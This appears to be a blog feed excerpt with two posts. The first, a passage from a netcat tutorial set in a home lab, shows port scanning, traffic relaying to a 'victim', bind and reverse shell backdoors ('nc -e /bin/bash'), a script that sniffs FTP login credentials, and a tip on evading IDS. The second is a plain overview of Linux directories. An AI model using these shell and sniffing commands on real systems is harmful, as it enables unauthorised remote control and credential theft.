<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc 192.168.127.130 21
</span><span class='line'>220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
</span><span class='line'>220-You are user number 1 of 50 allowed.
</span><span class='line'>220-Local time is now 17:23. Server port: 21.
</span><span class='line'>220-This is a private system - No anonymous login
</span><span class='line'>220-IPv6 connections are also welcome on this server.
</span><span class='line'>220 You will be disconnected after 15 minutes of inactivity.</span></code></pre></td></tr></table></div></figure>


<p>As you can see, there is some information available about the server, including the type of the FTP server, the number of logged in users and the maximum number allowed, the local time of the system, the fact that anonymous logins are disallowed, and that it&rsquo;s possible to connect via IPv6. Depending on the configuration of a server, the information disclosed could be pretty detailed, or sparse and misleading, as to not give away too much info to a potential attacker.</p>

<p>Now let&rsquo;s try banner grabbing from an HTTP server by sending a HEAD request:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc 192.168.127.130 80
</span><span class='line'>HEAD / HTTP/1.0
</span><span class='line'>
</span><span class='line'>HTTP/1.1 200 OK
</span><span class='line'>Date: Fri, 21 Feb 2014 17:51:58 GMT
</span><span class='line'>Server: Apache/2.2.14 (Ubuntu)
</span><span class='line'>Last-Modified: Tue, 10 May 2011 16:01:46 GMT
</span><span class='line'>ETag: "27bda-b1-4a2ee12abae80"
</span><span class='line'>Accept-Ranges: bytes
</span><span class='line'>Content-Length: 177
</span><span class='line'>Vary: Accept-Encoding
</span><span class='line'>Connection: close
</span><span class='line'>Content-Type: text/html</span></code></pre></td></tr></table></div></figure>


<p>This information can vary as well, this time the bit we&rsquo;re interested in is the server version and the operating system. Sometimes there is more to be discovered, like the PHP version that powers the server etc.</p>

<h3>Chat server</h3>

<p>Let&rsquo;s now look at how easy it is to use netcat for a very simple chat server.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -v -l -p 4444
</span><span class='line'>listening on [any] 4444 ...</span></code></pre></td></tr></table></div></figure>


<p>In the above command I told netcat to listen on port 4444. The -v flag is for more verbose output.</p>

<p>Now, from a different terminal window (or machine), connect to that port with netcat and start typing stuff. You will see the output being echoed in the server window. If you type stuff back from the server window, you will see it printed in the client window:</p>

<p><img class="center" src="http://chousensha.github.io/images/nc_chat.png" title="nc_chat" alt="chat"></p>

<h3>File transfer</h3>

<p>To transfer files between 2 machines, netcat can be used in the following way. On one computer, let&rsquo;s tell netcat to listen on a port and push a file to the socket:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -v -l -p 4444 &lt; confidential.txt
</span><span class='line'>listening on [any] 4444 ...</span></code></pre></td></tr></table></div></figure>


<p>Bascially, this takes the file and pushes it on the listening socket, ready to be pulled by a client that connects to that port. Now, from another computer, connect to the listener and redirect whatever you receive to a file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -v 192.168.127.130 4444 &gt; transfer.txt
</span><span class='line'>192.168.127.130: inverse host lookup failed: Unknown server error : Connection timed out
</span><span class='line'>(UNKNOWN) [192.168.127.130] 4444 (?) open</span></code></pre></td></tr></table></div></figure>


<p>Now we can check that we have a new file named transfer.txt which has the same contents as the file that was offered by the server, confidential.txt. Note that netcat doesn&rsquo;t give any indication of the transfer progress or its completion.</p>

<h3>Port scanning</h3>

<p>Netcat can also be used as a very basic port scanner:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -v -n -z -w1 192.168.127.130 1-1000
</span><span class='line'>(UNKNOWN) [192.168.127.130] 80 (www) open
</span><span class='line'>(UNKNOWN) [192.168.127.130] 21 (ftp) open</span></code></pre></td></tr></table></div></figure>


<p>Here we scanned the range of ports between 1 and 1000 and we determined that ports 21 and 80 are open. The -n switch disables DNS lookup, the -z is for not sending any data, thus reducing the time it requires to talk to the ports. And the -w1 tells netcat to wait 1 second before determining that a connection occurred. This is a TCP only scan. For UDP, add the -u flag.</p>

<h3>Port forwarding</h3>

<p>Netcat&rsquo;s port forwarding ability could be useful in a variety of scenarios, from bypassing traffic restrictions in a secure environment to using a proxy (or more) to conduct a MITM attack.</p>

<p>For this example, I will be using the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Attacker machine: 192.168.127.133
</span><span class='line'>Relaying machine: 192.168.127.130
</span><span class='line'>Victim machine: 192.168.127.129</span></code></pre></td></tr></table></div></figure>


<p>On the relay, use the following command:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -l -p 4444 -c "nc 192.168.127.129 22"</span></code></pre></td></tr></table></div></figure>


<p>This sets up a listener on port 4444. The -c flag specifies a shell command to be executed by the /bin/sh shell (if the system doesn&rsquo;t have such a shell, you can use the -e flag to execute a command or file instead. On a Windows machine, for instance, you could run cmd.exe or a batch file containing your desired commands). So, in the above, the proxy will forward connections it receives on port 4444 to the victim machine on port 22.</p>

<p>From the attacker machine, connect to the proxy:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc 192.168.127.130 4444
</span><span class='line'>SSH-2.0-OpenSSH_5.9</span></code></pre></td></tr></table></div></figure>


<p>Bingo! We can see that there is an SSH server waiting for someone to log in. On the victim machine, let&rsquo;s confirm that we have a connection:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>netstat -antp | grep 22
</span><span class='line'>tcp        0      0 192.168.127.129:22      192.168.127.130:43583   ESTABLISHED -</span></code></pre></td></tr></table></div></figure>


<p>So the victim is unaware of the real source of the connection! It sees the connection as originating from the relay machine.</p>

<h3>Remote backdoor &ndash; Bind shell</h3>

<p>Once an attacker has exploited a victim machine, he may want to return afterwards and have a nice, cozy backdoor waiting for him. If there is a direct connection between the 2 machines, netcat can be used to bind a shell to a port and wait for the attacker to connect. The shell will have the privileges of the user who spawned it, so it&rsquo;s best to have administrative privileges for full power over the system.</p>

<p>On the machine you want to backdoor, use netcat to bind the shell:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -v -l -p 5555 -e /bin/bash</span></code></pre></td></tr></table></div></figure>


<p>Now from another machine, use netcat to connect to it on that port and your shell will be waiting for you. Keep in mind there won&rsquo;t be any prompt or anything like that. Just type commands in the terminal.</p>

<p><img class="center" src="http://chousensha.github.io/images/nc_bindshell.png" title="nc_bindshell" alt="Bind shell"></p>

<h3>Reverse shell</h3>

<p>The more common way to use netcat for backdooring is to spawn a reverse shell that connects back to the atacker. This is useful in case the victim is behind a NAT or in a protected internal network that can&rsquo;t be directly accessed from the internet.</p>

<p>So, let&rsquo;s get on with it and start a listener on the attacking machine:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -v -l -n -p 5555
</span><span class='line'>listening on [any] 5555 ...</span></code></pre></td></tr></table></div></figure>


<p>Now let&rsquo;s connect from the victim machine:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -v -n 192.168.127.130 5555 -e /bin/bash
</span><span class='line'>(UNKNOWN) [192.168.127.130] 5555 (?) open</span></code></pre></td></tr></table></div></figure>


<p>Basically, the victim machine sent the attacker a shell, and now we control the victim again. I used the -n switch as well to disable all those pesky inverse lookups.</p>

<p><img class="center" src="http://chousensha.github.io/images/nc_reverse.png" title="nc_reverse" alt="reverse shell"></p>

<h3>Honeypot</h3>

<p>It is possible to set up a very simple honeypot using netcat. I grabbed the banner for the Pure-FTPd server and copied it to a file called banner.txt. Now start listening on port 21 and serve that banner for visitors:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vv -l -n -p 21 &lt; banner.txt | cat &gt; log.txt</span></code></pre></td></tr></table></div></figure>


<p>The additional -v flag is for extra verbosity and the data received is piped to a log file. Now, from another machine, let&rsquo;s connect to port 21 and see what we get:</p>

<p><img class="center" src="http://chousensha.github.io/images/nc_honeypot.png" title="nc_honeypot" alt="honeypot"></p>

<p>Here we&rsquo;re seeing the familiar FTP banner even though there&rsquo;s no real FTP server running. We send some random data and now let&rsquo;s check on the other machine that this data has been logged:</p>

<p><img class="center" src="http://chousensha.github.io/images/nc_log.png" title="nc_log" alt="Log output"></p>

<p>Of course, you might want netcat to keep on listening and not stop after every connection. Consider writing a script for that or look into versions that have continuous connection options.</p>

<h3>Sniffer</h3>

<p>Netcat can also be used to sniff traffic from a specific port. One machine has Pure-FTPd running on port 21. On the same machine, we&rsquo;ll use netcat to listen on some other port and execute a script:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -l -p 4444 -n -vv -e /root/sniff
</span><span class='line'>listening on [any] 4444 ...</span></code></pre></td></tr></table></div></figure>


<p>The script file contains the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#!/bin/bash
</span><span class='line'>nc -o /root/log 192.168.127.130 21</span></code></pre></td></tr></table></div></figure>


<p>The -o flag is for hex dumping the traffic. This script tells netcat to hex dump the traffic that comes to port 21 and write it to the /root/log file. And on the command line I used netcat to listen on port 4444 and call this script. Now let&rsquo;s try connecting from another machine to the port that netcat listens on:</p>

<p><img class="center" src="http://chousensha.github.io/images/nc_ftp.png" title="nc_ftp" alt="FTP"></p>

<p>Since this is a test lab and I already knew about the FTP server being sniffed, I tried to log in directly.</p>

<p>Let&rsquo;s check what got logged on the other machine:</p>

<p><em>cat /root/log | more</em></p>

<p><img class="center" src="http://chousensha.github.io/images/nc_hex.png" title="nc_hexdump" alt="dump"></p>

<p>There we go! We have a file containing the traffic to port 21, and we can see the attempt to log in has failed with the given credentials. But when a legitimate user will log in, we will have the right username and password.</p>

<h3>Disk cloning</h3>

<p>Yes, you can even copy hard disks over the network with netcat, in conjunction with the <em>dd</em> program.</p>

<p>On the system that you want to copy from, run this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dd if=/dev/sda | nc 192.168.127.130 5555</span></code></pre></td></tr></table></div></figure>


<p>And on the machine you&rsquo;re copying to:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -l -p 5555 | dd of=/dev/sda</span></code></pre></td></tr></table></div></figure>


<p>Be careful when performing operations on hard drives, best to test them on virtual machines first than realizing you just wiped your HDD.</p>

<p>I hope by now you realize how powerful netcat can be and its usefulness in a variety of scenarios. Of course, during a real penetration test or uhm, hack attempt, you will probably want to encrypt your traffic with cryptcat or something, since by now, all the IDS vendors are including signatures for netcat. Also, the examples were kept simple for ease of understanding, but in the real world netcat would be chained together with other tools to create complex and stealthy attacks.</p>

<blockquote><p>If more of us valued food and cheer and song above hoarded gold, it would
be a merrier world.
&mdash; J.R.R. Tolkien</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Touring the Linux directories]]></title>
    <link href="http://chousensha.github.io/blog/2014/05/28/touring-the-linux-directories/"/>
    <updated>2014-05-28T21:58:52+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/05/28/touring-the-linux-directories</id>
    <content type="html"><![CDATA[<p>The Linux directory tree can be a bit daunting, to say the least, for those coming from Windows backgrounds and accustomed to visiting only Documents and Program Files directories. So I thought about summarizing the important directories in the filesystem hierarchy. Here it goes.</p>

<!-- more -->


<p><strong>/</strong> This is the root directory, the starting point for the filesystem tree. This is not the same as the root user&rsquo;s home directory, which is /root. Only the root user has write privileges inside this directory.</p>

<p><strong>/boot</strong> Contains static files needed for booting. The boot loader, the initial RAM disk image and the Linux kernel are among the most important things you&rsquo;ll find here.</p>

<p><strong>/bin</strong> Binaries (executables) for the common utilities that are used by all users on the system (such as ls, grep, shells etc.) are located here. The programs stored here need to be available in single user mode.</p>

<p><strong>/dev</strong> Device files associated with physical hardware are found here. There are some virtual devices here that don&rsquo;t correspond to physical devices, like /dev/random, that creates random numbers, and the (in)famous black hole, /dev/null.</p>

<p><strong>/etc</strong> In here there are system-wide configuration files for all programs. Scripts for starting / stopping services are also found here. This is a very important directory, since the configuration of the entire system depends on it. That&rsquo;s why it should be backed up on a regular basis, to save all the configuration details in case something bad might happen that requires re-installation. The configuration files are text files that can be edited manually.</p>

<p><strong>/home</strong> The home directories for all users reside here. Every user keeps his data and user defined configuration files here. Users have supreme power and privileges inside their home directory.</p>

<p><strong>/lib</strong> Here you can find the shared libraries (the equivalents of Windows DLLs) required by the core system binaries. The /modules subdirectory contains kernel modules (drivers that can be loaded and unloaded as needed.</p>

<p><strong>/media</strong> Mount points for removable media, such as CDs, DVDs, USBs, are found in this directory.</p>

<p><strong>/mnt</strong> This is a generic mount point for mounting temporary filesystems.</p>

<p><strong>/opt</strong> This directory holds optional software packages and third party applications that aren&rsquo;t found in a default Linux installation, such as commercial software.</p>

<p><strong>/proc</strong> This is a pseudo filesystem that contains information about the system resources and running processes.</p>

<p><strong>/root</strong> This is the home directory for the root user.</p>

<p><strong>/sbin</strong> Here you can find system binaries that are used for system maintenance and administrative tasks, like ifconfig, fdisk etc.</p>

<p><strong>/tmp</strong> In here you can find temporary files that are normally deleted when the system restarts. Applications may store here some files needed for their operation, that can get deleted on the fly by utilities such as cron jobs when they are no longer required.</p>

<p><strong>/lost+found</strong> In case of a system crash, the system will do a filesystem check at the next boot, attempting to recover files that got corrupted during the crash. These files will be placed here. Note that there is a high change the files aren&rsquo;t completely recovered.</p>

<p><strong>/usr</strong> Non critical user binaries are placed here, along with their documentation and libraries. This is the largest directory on a Linux system. In the /usr/local directory you can find locally compiled software. The /usr/src directory holds kernel source files and headers.</p>

<p><strong>/var</strong> This directory holds variable files that are expected to grow in size. Various types of files can be found here, such as log files, databases, mail, print queues, lock files and other runtime files.</p>

<p><strong>/srv</strong> Contains data for services provided by servers.</p>

<p>And the cookie:</p>

<blockquote><p>Try to have as good a life as you can under the circumstances.</p></blockquote>
]]></content>
  </entry>
  
</feed>
